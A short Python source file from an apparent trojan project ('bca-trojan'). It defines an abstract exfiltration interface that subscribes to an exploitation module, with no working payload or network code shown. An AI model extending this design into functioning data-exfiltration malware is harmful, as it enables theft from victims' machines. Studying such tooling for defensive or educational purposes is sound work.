#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import abc

from src.modules.exploitation.exploitation_module import ExploitationModule


class ExfiltrationModule(abc.ABC):
    def __init__(self, module: ExploitationModule):
        """Interface for the implementation of all exfiltrators.

        Args:
            module: Instance of ExploitationModule from which the
                exfiltrator receive data by attaching itself as a
                subscriber.
        """
        self.module = module
        self.module.register_exfiltrator(self)

    @abc.abstractmethod
    def update(self, message: [str, None]):
        """To be implemented with the logic specific to each
        exfiltration mechanism."""
